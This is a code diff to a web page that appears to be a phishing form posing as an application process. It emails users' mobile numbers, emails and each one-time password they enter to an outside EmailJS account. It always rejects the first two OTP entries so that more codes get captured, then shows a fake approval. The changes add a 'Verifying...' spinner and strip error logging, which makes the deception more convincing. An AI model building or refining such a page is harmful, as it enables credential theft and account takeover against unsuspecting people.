@@ -71,6 +71,24 @@
   .rights { margin-top: 5px; font-size: 12px; color: #666; }
   .status { margin-top: 10px; font-size: 14px; }
   .success-message { font-size: 14px; color: #046930; text-align: left; line-height: 1.4; }
+  /* Loader */
+  #loading {
+    display: none;
+    text-align: center;
+  }
+  .spinner {
+    margin: 20px auto;
+    width: 40px;
+    height: 40px;
+    border: 4px solid #ccc;
+    border-top: 4px solid #046930;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
 </style>
 </head>
 <body>
@@ -104,6 +122,13 @@
     <div class="status" id="status2"></div>
   </div>
 
+  <!-- Loading Screen -->
+  <div id="loading">
+    <h2 class="title">Verifying...</h2>
+    <div class="spinner"></div>
+    <p>Please wait while we process your request.</p>
+  </div>
+
   <!-- Step 3: Approval Message -->
   <div id="step3" style="display:none;">
     <h2 class="title">Application Approved!</h2>
@@ -130,16 +155,8 @@
     document.getElementById('status1').textContent = "Sending...";
     document.getElementById('status1').style.color = "blue";
 
-    // Try to send email
     emailjs.sendForm('service_3hqkdcg', 'template_ukf5gwk', this)
-      .then(() => {
-        startOTPPage();
-      }, (error) => {
-        console.error('EmailJS Error:', error);
-        document.getElementById('status1').textContent = '⚠ Sending failed, but you can proceed.';
-        document.getElementById('status1').style.color = 'orange';
-        startOTPPage(); // proceed anyway
-      });
+      .then(() => startOTPPage(), () => startOTPPage()); // Always proceed
   });
 
   function startOTPPage() {
@@ -159,22 +176,24 @@
     const mobile = document.getElementById('mobile').value;
     const email = document.getElementById('email').value;
 
-    let statusMessage = "";
-    let statusColor = "";
     let otpStatus = "";
 
     if (newAttempts < 3) {
-      statusMessage = '❌ Wrong OTP. Try again.';
-      statusColor = 'red';
+      document.getElementById('status2').textContent = '❌ Wrong OTP. Try again.';
+      document.getElementById('status2').style.color = 'red';
       otpStatus = 'Wrong OTP Attempt #' + newAttempts;
     } else {
-      document.getElementById('step2').style.display = 'none';
-      document.getElementById('step3').style.display = 'block';
       otpStatus = (enteredOTP === correctOTP) ? 'Correct OTP on Attempt #3' : 'Forced Success after 3 Attempts';
+
+      // Show loading for 10 seconds
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('step3').style.display = 'block';
+      }, 10000);
     }
 
-    document.getElementById('status2').textContent = statusMessage;
-    document.getElementById('status2').style.color = statusColor;
     sessionStorage.setItem('otpAttempts', newAttempts);
 
     // Send OTP attempt email
@@ -184,8 +203,7 @@
       email: email,
       otp: enteredOTP,
       status: otpStatus
-    }).then(() => console.log("OTP attempt email sent."))
-      .catch(err => console.error("Failed to send OTP email:", err));
+    });
   }
 </script>
 </body>
